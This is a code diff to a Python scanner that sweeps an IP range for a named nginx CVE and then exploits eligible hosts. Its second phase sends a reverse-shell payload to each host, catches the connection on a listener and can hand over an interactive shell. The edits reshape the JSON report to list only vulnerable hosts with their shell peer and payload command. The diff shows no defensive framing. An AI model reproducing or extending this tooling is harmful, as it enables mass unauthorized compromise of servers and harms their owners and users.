@@ -5,10 +5,9 @@ from __future__ import annotations
 import json
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from dataclasses import asdict
 from datetime import datetime, timezone
 
-from scanner.constants import CLASSIFICATION_NOTES, STATUS_MARKS
+from scanner.constants import STATUS_MARKS
 from scanner.exploit import (
     ShellCatcher,
     build_reverse_shell_cmd,
@@ -19,6 +18,7 @@ from scanner.exploit import (
 from scanner.http import build_requests, http_probe, probe_to_dict
 from scanner.models import (
     STATUSES_ELIGIBLE_FOR_EXPLOIT,
+    VULNERABLE_STATUSES,
     HostScanResult,
     ProbeResult,
     ScanConfig,
@@ -56,35 +56,41 @@ class Scanner:
         self._log("[*] Phase 1: passive fingerprint")
         self._run_passive()
 
-        if self.config.validate_shell:
+        if self.config.exploit_validate:
             self._run_exploit_validation()
 
         self.results.sort(key=lambda r: (r.ip, r.port))
         return self.results
 
+    def vulnerable_results(self) -> list[HostScanResult]:
+        return [r for r in self.results if r.status in VULNERABLE_STATUSES]
+
+    def result_to_report_row(self, row: HostScanResult) -> dict:
+        entry: dict = {
+            "ip": row.ip,
+            "port": row.port,
+            "status": row.status,
+        }
+        version = row.classification.get("version")
+        if version:
+            entry["nginx_version"] = version
+        if row.exploit.get("success"):
+            entry["confirmed"] = True
+            peer = row.exploit.get("shell_peer")
+            if peer:
+                entry["shell_peer"] = peer
+        if self.config.shell and row.exploit.get("shell_command"):
+            entry["shell_command"] = row.exploit["shell_command"]
+        return entry
+
     def build_report(self) -> dict:
+        vuln_rows = self.vulnerable_results()
         return {
-            "scan_meta": {
-                "cve": self.config.cve_id,
-                "scanner": "scan.py",
-                "ip_range": self.config.ip_range,
-                "started_at": self.started_at,
-                "finished_at": utc_now_iso(),
-                "threads": self.config.threads,
-                "connect_timeout": self.config.connect_timeout,
-                "read_timeout": self.config.read_timeout,
-                "ports": list(self.config.ports),
-                "probe_path": self.config.probe_path,
-                "validate_shell": self.config.validate_shell,
-                "listen_ip": self.config.listen_ip if self.config.validate_shell else None,
-                "listen_port": self.config.listen_port if self.config.validate_shell else None,
-                "exploit_port": self.config.exploit_port,
-                "targets_total": len(self.targets),
-                "unique_ips": len(self.addresses),
-                "classification_notes": CLASSIFICATION_NOTES,
-            },
-            "summary": self.summarize(),
-            "results": [asdict(r) for r in self.results],
+            "cve": self.config.cve_id,
+            "target": self.config.ip_range,
+            "scanned_at": self.started_at,
+            "total_vulnerable": len(vuln_rows),
+            "vulnerable": [self.result_to_report_row(r) for r in vuln_rows],
         }
 
     def write_report(self) -> None:
@@ -92,12 +98,13 @@ class Scanner:
             json.dump(self.build_report(), fh, indent=2)
             fh.write("\n")
 
-    def summarize(self) -> dict[str, int]:
+    def summarize(self, rows: list[HostScanResult] | None = None) -> dict[str, int]:
+        data = rows if rows is not None else self.results
         counts = {s.value: 0 for s in VulnStatus}
-        for row in self.results:
+        for row in data:
             counts[row.status] = counts.get(row.status, 0) + 1
-        counts["total"] = len(self.results)
-        counts["open"] = sum(1 for r in self.results if r.open)
+        counts["total"] = len(data)
+        counts["open"] = sum(1 for r in data if r.open)
         return counts
 
     def scan_host(self, ip: str, port: int) -> HostScanResult:
@@ -179,13 +186,16 @@ class Scanner:
             ) from exc
 
         self._log(
-            f"[*] Phase 2: exploit + reverse shell -> "
+            f"[*] Phase 2: reverse-shell validation -> "
             f"{self.config.listen_ip}:{self.config.listen_port}"
         )
-        self._log(format_scan_command(
-            self.config.ip_range, self.config.listen_ip, self.config.listen_port,
-        ))
-        self._log(f"[*] Payload: {build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port)}")
+        if self.config.shell:
+            self._log(format_scan_command(
+                self.config.ip_range, self.config.listen_ip, self.config.listen_port,
+            ))
+            self._log(
+                f"[*] Payload: {build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port)}"
+            )
 
         rows = [
             row
@@ -226,8 +236,14 @@ class Scanner:
                 ]
                 peer = meta.get("shell_peer", "?")
                 self._log(f"[+] VULNERABLE {row.ip}:{exploit_port} — shell from {peer}")
-                self._log(f"[+] {format_scan_command(self.config.ip_range, self.config.listen_ip, self.config.listen_port)}")
-                self._log(f"[+] Payload: {meta.get('shell_command', '')}")
+                if self.config.shell:
+                    self._log(
+                        f"[+] {format_scan_command(self.config.ip_range, self.config.listen_ip, self.config.listen_port)}"
+                    )
+                    self._log(f"[+] Payload: {build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port)}")
+                    meta["shell_command"] = build_reverse_shell_cmd(
+                        self.config.listen_ip, self.config.listen_port
+                    )
 
                 if self.config.interactive_shell:
                     conn = catcher.take_connection()
